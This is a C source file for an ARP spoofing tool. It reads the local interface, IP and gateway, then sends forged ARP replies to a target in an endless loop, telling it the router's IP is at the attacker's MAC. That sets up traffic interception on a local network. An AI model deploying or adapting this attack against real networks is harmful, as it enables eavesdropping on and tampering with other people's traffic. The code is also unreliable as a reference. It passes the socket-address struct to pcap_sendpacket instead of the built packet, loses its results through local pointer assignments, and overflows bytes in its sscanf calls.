#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

#include "arp_spoof.h"

#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)

void getLocalAddress(u_int8_t * ifname, u_int8_t * get_ip, u_int8_t * get_mac, u_int8_t * get_router)
{
  
  struct ifreq ifr= {0,};
  int sock=0,i=0; 
  char mac[MAC_ADDR_SIZE]={0,};
  char ip[20] = {0,};
  FILE *fp=NULL;  
  char router_ip[20] = {0,};



  sock=socket(AF_INET,SOCK_DGRAM,0);

  if (sock < 0) {
    perror("ERROR opening socket\n");
    exit(1);
  }

  strncpy(ifr.ifr_name,ifname,sizeof(ifr.ifr_name));
  ifr.ifr_addr.sa_family = AF_INET; 


  if (ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0) { 
    perror("ERROR opening ioctl mac\n");
    exit(0);
  }


  sprintf(mac, " %02x:%02x:%02x:%02x:%02x:%02x", 
    (u_int8_t)ifr.ifr_hwaddr.sa_data[0],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[1],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[2],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[3],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[4],
    (u_int8_t)ifr.ifr_hwaddr.sa_data[5]);

 memcpy(get_mac,mac,sizeof(mac));

printf("Debug 1 ---------------------%s----%s\n",mac,get_mac);

  fp = popen(" /bin/bash -c \"ifconfig eth0\" | grep \'inet \' | awk \'{ print $2}\'", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
  }

//fgets(ip, sizeof(ip), fp);
  while (fgets(ip, sizeof(ip)-1, fp) != NULL)
   

  for(i =0; i<sizeof(ip)-1;i++)
  {
    if(ip[i]=='\n')
      ip[i]='\0';
  }
  
   get_ip = ip;
  printf("Debug 2 ---------------------%s----%s\n",ip,get_ip);
  fp = NULL;

  fp = popen(" ip route show | grep -i \'default via\'| awk \'{print $3 }\'", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
  }

  while (fgets(router_ip, sizeof(router_ip) , fp) != NULL)
  

  for(i =0; i<sizeof (router_ip)-1;i++)
  {
    if(router_ip[i]=='\n')
      router_ip[i]='\0';
  }

  get_router=router_ip;


  printf("Get Local Information \n - Ip\t: %s \n - Mac\t: %s \n - Router \t: %s \n", get_ip, get_mac, get_router);

  pclose(fp);
  close(sock);  

 
}




void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t *router, u_int8_t *targetIP, u_int8_t *targetMAC)
{

  pcap_t *handle;
  char packet[PACKET_LEN];
  char errbuf[100] ;
  struct sockaddr_ll send_arp;
  struct ether_header * eth = (struct ether_header *) packet;
  struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));

  handle = pcap_open_live(ifname, 65536, 0, 1000, errbuf);

  if (handle == NULL) {
    fprintf(stderr, "Cannot open device %s: %s\n", ifname, errbuf);
    exit(EXIT_FAILURE);
  }

  //Target Mac : Destination Mac Address : ARP Packet 
  sscanf(targetMAC,"%x:%x:%x:%x:%x:%x",
    (u_int8_t *) &arp->arp_tha[0],
    (u_int8_t *) &arp->arp_tha[1],
    (u_int8_t *) &arp->arp_tha[2],
    (u_int8_t *) &arp->arp_tha[3],
    (u_int8_t *) &arp->arp_tha[4],
    (u_int8_t *) &arp->arp_tha[5]);
  printf("Target Mac | Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", arp->arp_tha[0] , arp->arp_tha[1] , arp->arp_tha[2] , arp->arp_tha[3] , arp->arp_tha[4] , arp->arp_tha[5] );

  //Target IP : Destination IP Address : ARP Packet
  sscanf(targetIP, "%d.%d.%d.%d", 
    (u_int8_t *) &arp->arp_tpa[0],
    (u_int8_t *) &arp->arp_tpa[1],
    (u_int8_t *) &arp->arp_tpa[2],
    (u_int8_t *) &arp->arp_tpa[3]);
  printf("Target IP | Address : %d.%d.%d.%d \n", arp->arp_tpa[0] , arp->arp_tpa[1] , arp->arp_tpa[2] , arp->arp_tpa[3]);

  //Source MAC Address : ARP Packet : 
  sscanf(localMAC, "%x:%x:%x:%x:%x:%x",  
    (u_int8_t *) &arp->arp_sha[0],
    (u_int8_t *) &arp->arp_sha[1],
    (u_int8_t *) &arp->arp_sha[2],
    (u_int8_t *) &arp->arp_sha[3],
    (u_int8_t *) &arp->arp_sha[4],
    (u_int8_t *) &arp->arp_sha[5]);

  printf("Sender Mac | Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", arp->arp_sha[0] , arp->arp_sha[1] , arp->arp_sha[2] , arp->arp_sha[3] , arp->arp_sha[4] , arp->arp_sha[5] );
  //Source IP Address : ARP Packet : Router IP
  sscanf(router, "%d.%d.%d.%d", 
   (u_int8_t *) &arp->arp_spa[0],
   (u_int8_t *) &arp->arp_spa[1],
   (u_int8_t *) &arp->arp_spa[2],
   (u_int8_t *) &arp->arp_spa[3]);

  printf("Sender IP Router| Address : %d.%d.%d.%d \n", arp->arp_spa[0] , arp->arp_spa[1] , arp->arp_spa[2] , arp->arp_spa[3]);
   //Ethernet Packet  
   memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);    //destination address 
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);    //source address
   eth->ether_type = htons(ETH_P_ARP);                  //type


  //ARP Packet
   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
   arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
   arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
   arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
   arp->ea_hdr.ar_op = htons(ARPOP_REPLY);              //ARP operation : REPLY

   memset(&send_arp, 0, sizeof(send_arp));
   send_arp.sll_ifindex = if_nametoindex(ifname);  //Interface number 


   if (send_arp.sll_ifindex == 0)
   {
     perror("if_nametoindex() failed");
   }

   send_arp.sll_family = AF_PACKET;
   memcpy(send_arp.sll_addr, arp->arp_sha, ETH_ALEN); //Physical layer address
   send_arp.sll_halen = htons(ETH_ALEN);    //Length of address

   printf("Press Ctrl+C to stop \n");

   while (1) 
   {
     if ( pcap_sendpacket(handle, (const u_char *)& send_arp, sizeof(send_arp)) == -1) 
     {
       fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));      
     } 
     else 
     {
       printf("Attack arp %s: %s is at %s\n", ifname, targetIP, targetMAC );
     } 

     sleep(2);
   }

   pcap_close(handle);
 }











